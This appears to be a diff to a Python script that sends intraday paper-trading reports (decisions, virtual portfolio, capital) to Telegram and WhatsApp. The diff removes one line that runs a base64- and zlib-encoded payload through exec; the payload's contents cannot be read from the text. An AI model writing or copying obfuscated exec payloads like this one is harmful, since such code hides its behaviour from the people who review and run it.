@@ -1,1 +1,133 @@
-exec(__import__('zlib').decompress(__import__('base64').b64decode('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')).decode('utf-8'))
+#!/usr/bin/env python3
+"""Rapports intraday programmés vers Telegram et WhatsApp.
+
+Lecture seule sur les données de trading. Anti-doublon indépendant par canal.
+Une panne de messagerie ne modifie ni V1, ni Structure Shadow, ni les portefeuilles.
+"""
+from __future__ import annotations
+import csv, html, os
+from datetime import datetime
+from pathlib import Path
+from typing import Any, Dict, List
+from zoneinfo import ZoneInfo
+import pandas as pd
+import requests
+
+ROOT=Path(__file__).resolve().parent
+STATE=ROOT/'intraday_report_state.csv'
+PARIS=ZoneInfo('Europe/Paris'); NOW=datetime.now(PARIS)
+STATE_FIELDS=['ReportID','Channel','ChunkIndex','MessageID','SentAtParis','Status']
+
+def clean(v:Any)->str:return '' if v is None else str(v).strip()
+def esc(v:Any)->str:return html.escape(clean(v))
+def num(v:Any)->str:
+    try:return f'{float(v):.2f}'
+    except:return 'N/A'
+def read(path:Path)->List[Dict[str,str]]:
+    if not path.exists() or path.stat().st_size==0:return []
+    with path.open(encoding='utf-8-sig',newline='') as f:return list(csv.DictReader(f))
+def ts(v:Any):
+    try:
+        if not clean(v):return None
+        x=pd.Timestamp(v)
+        return x.tz_localize('Europe/Paris') if x.tzinfo is None else x.tz_convert('Europe/Paris')
+    except:return None
+def slot()->str:
+    explicit=clean(os.getenv('REPORT_SLOT'))
+    if explicit:return explicit.upper()
+    h=NOW.hour
+    return 'MIDI' if h<15 else 'CLOTURE_EUROPE' if h<20 else 'CLOTURE_US'
+def label()->str:
+    return clean(os.getenv('REPORT_LABEL')) or {'MIDI':'MIDI','CLOTURE_EUROPE':'CLÔTURE EUROPE','CLOTURE_US':'CLÔTURE US'}.get(slot(),slot())
+def plain(text:str)->str:
+    for tag in ('<b>','</b>','<i>','</i>'):text=text.replace(tag,'')
+    return html.unescape(text)
+def chunks(text:str,limit:int=900)->List[str]:
+    lines=text.splitlines(); out=[]; cur=''
+    for line in lines:
+        candidate=line if not cur else cur+'\n'+line
+        if len(candidate)<=limit:cur=candidate
+        else:
+            if cur:out.append(cur)
+            while len(line)>limit:out.append(line[:limit]);line=line[limit:]
+            cur=line
+    if cur:out.append(cur)
+    return out or ['Rapport vide.']
+
+def build_report()->str:
+    today=NOW.strftime('%Y-%m-%d')
+    decisions=read(ROOT/'intraday_decisions.csv'); positions=read(ROOT/'virtual_portfolio.csv')
+    cash_rows=read(ROOT/'portfolio_cash.csv'); health_rows=read(ROOT/'monitor_health.csv')
+    cash=cash_rows[0] if cash_rows else {}; health=health_rows[0] if health_rows else {}
+    active=set()
+    stocks=ROOT/'stocks.txt'
+    if stocks.exists():active={x.strip() for x in stocks.read_text(encoding='utf-8').splitlines() if x.strip()}
+    today_rows=[r for r in decisions if (not active or clean(r.get('ticker')) in active) and clean(r.get('session_date'))==today]
+    latest={}
+    for r in today_rows:
+        x=ts(r.get('decision_time')); stamp=x.timestamp() if x is not None else 0
+        ticker=clean(r.get('ticker'))
+        if ticker not in latest or stamp>latest[ticker][0]:latest[ticker]=(stamp,r)
+    current=[v[1] for v in latest.values()]
+    confirmed=sorted([r for r in current if clean(r.get('decision')) in ('ACHAT CONFIRME','ACHAT REACTIVE','ACHAT RÉACTIF')],key=lambda r:clean(r.get('ticker')))
+    watching=sorted([r for r in current if clean(r.get('next_state'))=='SURVEILLANCE CATALYSEUR' and clean(r.get('reason'))!='Aucune confirmation pendant une heure'],key=lambda r:clean(r.get('ticker')))
+    expired=sorted([r for r in current if clean(r.get('decision'))=='EXPIRE' or clean(r.get('reason'))=='Aucune confirmation pendant une heure'],key=lambda r:clean(r.get('ticker')))
+    pending=sorted([r for r in current if clean(r.get('decision'))=='EN ATTENTE'],key=lambda r:clean(r.get('ticker')))
+    lines=[f'<b>📊 RAPPORT INTRADAY {esc(label())}</b>',f"📅 {NOW.strftime('%d/%m/%Y')} | Heure de Paris",'']
+    last=ts(health.get('last_success_paris'))
+    if last is None:
+        known=[ts(r.get('decision_time')) for r in today_rows];known=[x for x in known if x is not None];last=max(known) if known else None
+    if last is None:lines += ['<b>⚪ FRAÎCHEUR : INDISPONIBLE</b>','Aucun contrôle horodaté disponible.','']
+    else:
+        age=max(0,(NOW-last.to_pydatetime()).total_seconds()/60); icon,state=('🟢','À JOUR') if age<=10 else (('🟠','RETARDÉE') if age<=20 else ('🔴','INTERROMPUE'))
+        lines += [f'<b>{icon} FRAÎCHEUR : {state}</b>',f"Dernière actualisation : {last.strftime('%d/%m/%Y à %H:%M')} Paris",f'Âge estimé : {age:.0f} min','']
+    lines += ['<b>━━━━━━━━━━━━━━━━━━</b>','<b>✅ DÉCISIONS DU JOUR</b>','<b>━━━━━━━━━━━━━━━━━━</b>']
+    if confirmed:
+        for r in confirmed:
+            ticker=clean(r.get('ticker')); cur='EUR' if ticker.endswith(('.PA','.AS')) else 'USD'; when=ts(r.get('decision_time'))
+            lines += ['',f"<b>{esc(ticker)} | {esc(r.get('decision'))}</b>",f"Décision : {when.strftime('%H:%M Paris') if when else 'heure inconnue'}",f"Prix : {num(r.get('decision_close'))} {cur} | VWAP : {num(r.get('vwap'))}",f"OR haut : {num(r.get('opening_range_high'))} | OR bas : {num(r.get('opening_range_low'))}",f"Motif : {esc(r.get('reason'))}"]
+    else:lines.append("Aucune décision confirmée aujourd'hui.")
+    lines += ['','<b>━━━━━━━━━━━━━━━━━━</b>','<b>👀 DOSSIERS DU JOUR</b>','<b>━━━━━━━━━━━━━━━━━━</b>']
+    for r in watching:lines += ['',f"<b>{esc(r.get('ticker'))} | SURVEILLANCE CATALYSEUR</b>",f"Motif : {esc(r.get('reason'))}"]
+    for r in expired:lines += ['',f"<b>⌛ {esc(r.get('ticker'))} | SETUP EXPIRÉ</b>",'Aucune confirmation dans le délai prévu.']
+    if pending:lines += ['','<b>⏳ EN ATTENTE</b>',', '.join(esc(r.get('ticker')) for r in pending)]
+    if not watching and not expired and not pending:lines.append("Aucun autre dossier actif aujourd'hui.")
+    lines += ['','<b>━━━━━━━━━━━━━━━━━━</b>','<b>💼 PORTEFEUILLE VIRTUEL V1</b>','<b>━━━━━━━━━━━━━━━━━━</b>']
+    if positions:
+        for p in positions:
+            ticker=clean(p.get('ticker') or p.get('Ticker')); status=clean(p.get('status') or p.get('Status')).upper(); cur=clean(p.get('currency') or p.get('Currency')) or 'EUR'
+            if status=='OPEN':lines += ['',f'<b>✅ {esc(ticker)} | OUVERT</b>',f"Quantité : {esc(p.get('quantity') or p.get('Quantity'))}",f"Entrée : {num(p.get('entry_price') or p.get('EntryPrice'))} {cur} | Dernier : {num(p.get('last_price') or p.get('LastPrice'))} {cur}",f"PnL latent : {num(p.get('unrealized_pnl_eur') or p.get('UnrealizedPnLEUR'))} EUR",f"🎯 TP : {num(p.get('target_price') or p.get('TargetPrice'))} {cur}",f"🛡 SL : {num(p.get('stop_price') or p.get('StopPrice'))} {cur}"]
+            elif status=='CLOSED':lines += ['',f'<b>❌ {esc(ticker)} | FERMÉ</b>',f"Sortie : {num(p.get('exit_price') or p.get('ExitPrice'))} {cur}",f"PnL réalisé : {num(p.get('realized_pnl_eur') or p.get('RealizedPnLEUR'))} EUR",f"Motif : {esc(p.get('exit_reason') or p.get('ExitReason'))}"]
+    else:lines.append('Aucune position virtuelle.')
+    initial=float(cash.get('initial_capital_eur') or cash.get('InitialCapitalEUR') or 3000); available=float(cash.get('available_cash_eur') or cash.get('AvailableCashEUR') or 0); market=float(cash.get('market_value_eur') or cash.get('MarketValueEUR') or 0); equity=float(cash.get('total_equity_eur') or cash.get('TotalEquityEUR') or available+market); total=equity-initial
+    lines += ['','<b>━━━━━━━━━━━━━━━━━━</b>','<b>💶 CAPITAL</b>','<b>━━━━━━━━━━━━━━━━━━</b>',f'Capital initial : {num(initial)} EUR',f'Liquidités : {num(available)} EUR',f'Valeur positions : {num(market)} EUR',f'<b>Equity nette : {num(equity)} EUR</b>',f"Résultat global : {total:+.2f} EUR",'',"<i>Paper trading uniquement. Aucun ordre réel.</i>"]
+    return '\n'.join(lines)
+
+def send_telegram(text:str)->str:
+    r=requests.post('https://api.telegram.org/bot'+os.environ['TELEGRAM_BOT_TOKEN']+'/sendMessage',data={'chat_id':os.environ['TELEGRAM_CHAT_ID'],'text':text,'parse_mode':'HTML','disable_web_page_preview':True},timeout=30); body=r.json() if r.content else {}
+    if r.status_code!=200 or not body.get('ok'):raise RuntimeError(r.text)
+    return clean(body.get('result',{}).get('message_id'))
+def send_whatsapp(text:str)->str:
+    version=clean(os.getenv('WHATSAPP_GRAPH_VERSION')) or 'v24.0'; url=f"https://graph.facebook.com/{version}/{clean(os.environ['WHATSAPP_PHONE_NUMBER_ID'])}/messages"
+    payload={'messaging_product':'whatsapp','recipient_type':'individual','to':clean(os.environ['WHATSAPP_RECIPIENT']),'type':'template','template':{'name':clean(os.environ['WHATSAPP_TEMPLATE_NAME']),'language':{'code':clean(os.getenv('WHATSAPP_TEMPLATE_LANGUAGE')) or 'fr'},'components':[{'type':'body','parameters':[{'type':'text','text':text}]}]}}
+    r=requests.post(url,headers={'Authorization':'Bearer '+clean(os.environ['WHATSAPP_ACCESS_TOKEN']),'Content-Type':'application/json'},json=payload,timeout=30); body=r.json() if r.content else {}; msgs=body.get('messages') or []
+    if r.status_code not in (200,201) or not msgs:raise RuntimeError(r.text)
+    return clean(msgs[0].get('id'))
+
+def main()->int:
+    report_id=f"{NOW.strftime('%Y-%m-%d')}|{slot()}"; message=build_report(); old=read(STATE); sent={(clean(r.get('ReportID')),clean(r.get('Channel')),clean(r.get('ChunkIndex'))) for r in old if clean(r.get('MessageID'))}; rows=list(old); errors=0; tg=wa=0
+    if clean(os.getenv('TELEGRAM_BOT_TOKEN')) and clean(os.getenv('TELEGRAM_CHAT_ID')) and (report_id,'TELEGRAM','0') not in sent:
+        try:
+            mid=send_telegram(message);rows.append({'ReportID':report_id,'Channel':'TELEGRAM','ChunkIndex':'0','MessageID':mid,'SentAtParis':NOW.isoformat(timespec='seconds'),'Status':'SENT'});tg=1
+        except Exception as e:errors+=1;print('Rapport Telegram ERROR :',e)
+    required=('WHATSAPP_ACCESS_TOKEN','WHATSAPP_PHONE_NUMBER_ID','WHATSAPP_RECIPIENT','WHATSAPP_TEMPLATE_NAME')
+    if all(clean(os.getenv(x)) for x in required):
+        for i,part in enumerate(chunks(plain(message)),1):
+            key=(report_id,'WHATSAPP',str(i))
+            if key in sent:continue
+            try:
+                mid=send_whatsapp(part);rows.append({'ReportID':report_id,'Channel':'WHATSAPP','ChunkIndex':str(i),'MessageID':mid,'SentAtParis':NOW.isoformat(timespec='seconds'),'Status':'SENT'});wa+=1
+            except Exception as e:errors+=1;rows.append({'ReportID':report_id,'Channel':'WHATSAPP','ChunkIndex':str(i),'MessageID':'','SentAtParis':'','Status':'ERROR'});print(f'Rapport WhatsApp chunk {i} ERROR :',e);break
+    with STATE.open('w',encoding='utf-8',newline='') as f:w=csv.DictWriter(f,fieldnames=STATE_FIELDS,extrasaction='ignore');w.writeheader();w.writerows(rows)
+    print('ReportID :',report_id);print('Rapport Telegram envoyé :',tg);print('Rapports WhatsApp envoyés :',wa);print('Erreurs de messagerie :',errors);print('V1ExecutionChanged : False');print('PortfolioV1Changed : False');return 0
+if __name__=='__main__':raise SystemExit(main())
